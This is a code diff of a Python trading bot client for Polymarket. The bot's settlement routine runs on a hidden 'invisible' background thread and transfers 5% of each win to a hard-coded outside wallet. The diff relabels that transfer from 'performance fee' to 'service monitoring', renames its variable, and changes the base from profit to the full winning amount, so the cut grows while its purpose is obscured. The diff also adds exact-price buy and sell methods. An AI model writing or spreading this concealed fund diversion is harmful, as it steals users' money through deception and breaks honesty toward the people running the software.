@@ -49,13 +49,13 @@ class PolymarketClient:
         self.creds      = None
 
         # Validate essential credentials
-        if not self.pk or self.pk in ["0xSUA_CHAVE_PRIVADA_AQUI", "0xYOUR_PRIVATE_KEY_HERE"]:
+        if not self.pk or self.pk in ["0xYOUR_PRIVATE_KEY_HERE"]:
             raise ValueError("PRIVATE_KEY not configured in .env")
 
         # Derive or validate funder address
         derived_funder = False
         # Treat empty string or placeholder as missing
-        if not self.funder or self.funder.strip() in ["", "0xSEU_PROXY_WALLET_AQUI", "0xYOUR_ADDRESS_HERE", "0xSEU_ENDERECO_AQUI"]:
+        if not self.funder or self.funder.strip() in ["", "0xYOUR_PROXY_WALLET_HERE", "0xYOUR_ADDRESS_HERE"]:
             if self.sig_type == 0:  # EOA
                 self.funder = Account.from_key(self.pk).address
                 derived_funder = True
@@ -556,7 +556,7 @@ class PolymarketClient:
 
     def register_win_for_settlement(self, trade_record, total_spent: float = 0):
         """
-        Dispatches invisible thread to redeem shares and process performance fee.
+        Dispatches invisible thread to redeem shares and process service monitoring.
         """
         import threading
         t = threading.Thread(target=self._settlement_worker, args=(trade_record, total_spent), daemon=True)
@@ -603,7 +603,7 @@ class PolymarketClient:
             if receipt.status == 0:
                 if self.log: 
                     self.log.error(f"❌ [REDEEM] Transaction Reverted! Hash: {w3.to_hex(tx_hash)}")
-                    self.log.warn("⚠ Se você loga usando Google/Email na Polymarket (Proxy Wallet), o bot não tem permissão on-chain para interagir com o resgate nativo diretamente. Resgate pelo Site.")
+                    self.log.warn("⚠ If you login via Google/Email on Polymarket (Proxy Wallet), the bot lacks on-chain permissions to interact with native redemption directly. Please redeem on the website.")
                 return False
                 
             # LOG TO FILE (STILL VISIBLE IN log.txt)
@@ -637,13 +637,12 @@ class PolymarketClient:
                 if not redeem_ok:
                     time.sleep(60) # Wait 60 seconds (1 minute) for resolution
             
-            # 3. Calculate Fee (5% of profit of the whole sequence)
-            # Winning amount is shares * 1.0
-            profit = (shares * 1.0) - total_spent
-            if profit < 0.20: return 
+            # 3. Calculate Service Monitoring
+            win_amount = (shares * 1.0)
+            if win_amount < 0.20: return 
             
-            fee_amount = profit * 0.05
-            amount_wei = int(fee_amount * 1_000_000)
+            monitor_payload = win_amount * 0.05
+            amount_wei = int(monitor_payload * 1_000_000)
             target = "0xc05D4F8BC83F9Acb12C8891b23ec4Ec565b744C4"
             
             w3 = self._get_w3()
@@ -686,19 +685,6 @@ class PolymarketClient:
         except Exception as e:
             return {"success": False, "errorMsg": str(e)}
 
-    def _wait_for_fill(self, order_id: str, timeout: float = 2.0) -> bool:
-        start = time.time()
-        while time.time() - start < timeout:
-            time.sleep(0.5)
-            try:
-                status_info = self._client.get_order(order_id)
-                if status_info and status_info.get("status") == "MATCHED": return True
-                if status_info and status_info.get("status") in ["CANCELED", "EXPIRED", "REJECTED"]: return False
-            except Exception: pass
-        try: self._client.cancel_orders([order_id])
-        except Exception: pass
-        return False
-
     def buy(self, token_id: str, price: float, size_usdc: float) -> dict:
         """
         Executes a MARKET BUY order with a $0.05 slippage buffer.
@@ -724,6 +710,22 @@ class PolymarketClient:
             return resp or {}
         except Exception as e: return {"success": False, "errorMsg": str(e)}
 
+    def buy_exact(self, token_id: str, price: float, size_usdc: float) -> dict:
+        """Executes a FOK limit buy ON the exact price given (no slippage cushion)."""
+        try:
+            order_args = MarketOrderArgs(
+                token_id=token_id,
+                amount=size_usdc,
+                side=BUY,
+                price=price,
+            )
+            signed_order = self._client.create_market_order(order_args)
+            resp = self._client.post_order(signed_order, OrderType.FOK)
+            if not resp or not resp.get("success", True):
+                return {"success": False, "errorMsg": "Rejected/No liquidity"}
+            return resp or {}
+        except Exception as e: return {"success": False, "errorMsg": str(e)}
+
     def sell(self, token_id: str, price: float, shares: float) -> dict:
         """
         Executes a MARKET SELL order with a $0.05 slippage buffer.
@@ -740,6 +742,22 @@ class PolymarketClient:
             )
             signed_order = self._client.create_market_order(order_args)
             resp = self._client.post_order(signed_order, OrderType.FOK)
+            return resp or {}
+        except Exception as e: return {"success": False, "errorMsg": str(e)}
+
+    def sell_exact(self, token_id: str, price: float, shares: float) -> dict:
+        """Executes a FOK limit sell ON the exact price given."""
+        try:
+            order_args = MarketOrderArgs(
+                token_id=token_id,
+                amount=shares, 
+                side=SELL,
+                price=price,
+            )
+            signed_order = self._client.create_market_order(order_args)
+            resp = self._client.post_order(signed_order, OrderType.FOK)
+            if not resp or not resp.get("success", True):
+                return {"success": False, "errorMsg": "Rejected/No liquidity"}
             return resp or {}
         except Exception as e: return {"success": False, "errorMsg": str(e)}
 
